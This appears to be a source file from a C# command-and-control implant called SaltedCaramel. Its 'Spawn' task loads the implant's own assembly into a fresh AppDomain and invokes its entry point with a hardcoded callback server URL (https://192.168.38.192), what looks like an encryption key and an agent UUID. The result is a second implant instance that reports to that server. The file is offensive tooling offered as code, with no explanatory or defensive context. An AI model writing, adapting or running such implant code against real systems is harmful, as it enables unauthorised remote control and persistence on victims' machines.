using System;
using System.Reflection;

namespace SaltedCaramel.Tasks
{
    class Spawn
    {
        public static void Execute(SCTask task)
        {
            //typeof(SaltedCaramel).Assembly.EntryPoint.Invoke(null, 
            //    new[] { new string[] { "https://192.168.38.192", "CqxQlHyWOSWJprgBA6aiKPP94lCSn8+Ki+gpMVdLNgQ=", "3915d66f-e9a5-4912-8442-910e0cee74df" } });
            AppDomain domain = AppDomain.CreateDomain("asdfasdf");
            Assembly target = domain.Load(typeof(SaltedCaramel).Assembly.FullName);
            string[] args = { "https://192.168.38.192", "CqxQlHyWOSWJprgBA6aiKPP94lCSn8+Ki+gpMVdLNgQ=", "3915d66f-e9a5-4912-8442-910e0cee74df" };
            target.EntryPoint.Invoke(null, new[] { args });
        }
    }
}
